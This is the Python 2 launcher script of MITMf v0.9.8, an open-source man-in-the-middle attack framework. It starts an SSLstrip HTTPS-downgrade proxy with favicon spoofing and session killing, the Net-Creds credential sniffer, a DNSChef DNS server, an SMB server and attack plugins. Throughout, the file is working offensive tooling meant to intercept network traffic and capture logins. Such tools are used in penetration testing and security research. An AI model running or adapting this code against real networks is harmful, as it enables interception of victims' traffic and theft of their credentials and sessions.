#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import argparse
import sys
import os
import threading

from twisted.web import http
from twisted.internet import reactor
from core.utils import Banners, SystemConfig, shutdown
from core.logger import logger

from plugins import *

print Banners().get_banner()

if os.geteuid() != 0:
    sys.exit("[-] The derp is strong with this one")

parser = argparse.ArgumentParser(description="MITMf v0.9.8 - 'The Dark Side'", version="0.9.8 - 'The Dark Side'", usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.")

#add MITMf options
mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
mgroup.add_argument("-i", dest='interface', required=True, type=str, help="Interface to listen on")
mgroup.add_argument("-c", dest='configfile', metavar="CONFIG_FILE", type=str, default="./config/mitmf.conf", help="Specify config file to use")
mgroup.add_argument('-m', '--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')

#Add sslstrip options
sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
slogopts = sgroup.add_mutually_exclusive_group()
sgroup.add_argument("-p", "--preserve-cache", action="store_true", help="Don't kill client/server caching")
sgroup.add_argument("-l", dest='listen_port', type=int, metavar="PORT", default=10000, help="Port to listen on (default 10000)")
sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")

#Initialize plugins and pass them the parser NameSpace object
plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

#Check to see if we supplied a valid interface, pass the IP and MAC to the NameSpace object
options.ip  = SystemConfig.getIP(options.interface)
options.mac = SystemConfig.getMAC(options.interface)

#Set the log level
logger().log_level = logging.__dict__[options.log_level.upper()]
formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger('mitmf', formatter)

from core.sslstrip.CookieCleaner import CookieCleaner
from core.sergioproxy.ProxyPlugins import ProxyPlugins
from core.sslstrip.StrippingProxy import StrippingProxy
from core.sslstrip.URLMonitor import URLMonitor

URLMonitor.getInstance().setFaviconSpoofing(options.favicon)
CookieCleaner.getInstance().setEnabled(options.killsessions)

strippingFactory          = http.HTTPFactory(timeout=10)
strippingFactory.protocol = StrippingProxy

reactor.listenTCP(options.listen_port, strippingFactory)

#All our options should be loaded now, start initializing the plugins
print "[*] MITMf v0.9.8 - 'The Dark Side'"
for plugin in plugins:

    #load only the plugins that have been called at the command line
    if vars(options)[plugin.optname] is True:

        print "|_ {} v{}".format(plugin.name, plugin.version)
        if plugin.tree_info:
            for line in xrange(0, len(plugin.tree_info)):
                print "|  |_ {}".format(plugin.tree_info.pop())

        plugin.initialize(options)

        if plugin.tree_info:
            for line in xrange(0, len(plugin.tree_info)):
                print "|  |_ {}".format(plugin.tree_info.pop())

        ProxyPlugins.getInstance().addPlugin(plugin)
        plugin.reactor(strippingFactory)
        plugin.setup_logger()
        plugin.start_config_watch()

print "|"
print "|_ Sergio-Proxy v0.2.1 online"
print "|_ SSLstrip v0.9 by Moxie Marlinspike online"

#Start Net-Creds
from core.netcreds.NetCreds import NetCreds
NetCreds().start(options.interface)
print "|_ Net-Creds v{} online".format(NetCreds.version)

#Start DNSChef
from core.servers.dns.DNSchef import DNSChef
DNSChef.getInstance().start()
print "|_ DNSChef v{} online".format(DNSChef.version)

#Start the HTTP Server
#from core.servers.http.HTTPServer import HTTPServer
#HTTPServer.getInstance().start()
#print "|_ HTTP server online"

#Start the SMB server
from core.servers.smb.SMBserver import SMBserver
SMBserver.getInstance().start()
print "|_ SMB server online [Mode: {}] (Impacket {}) \n".format(SMBserver.getInstance().server_type, SMBserver.getInstance().impacket_ver)

#start the reactor
reactor.run()

print "\n"
shutdown()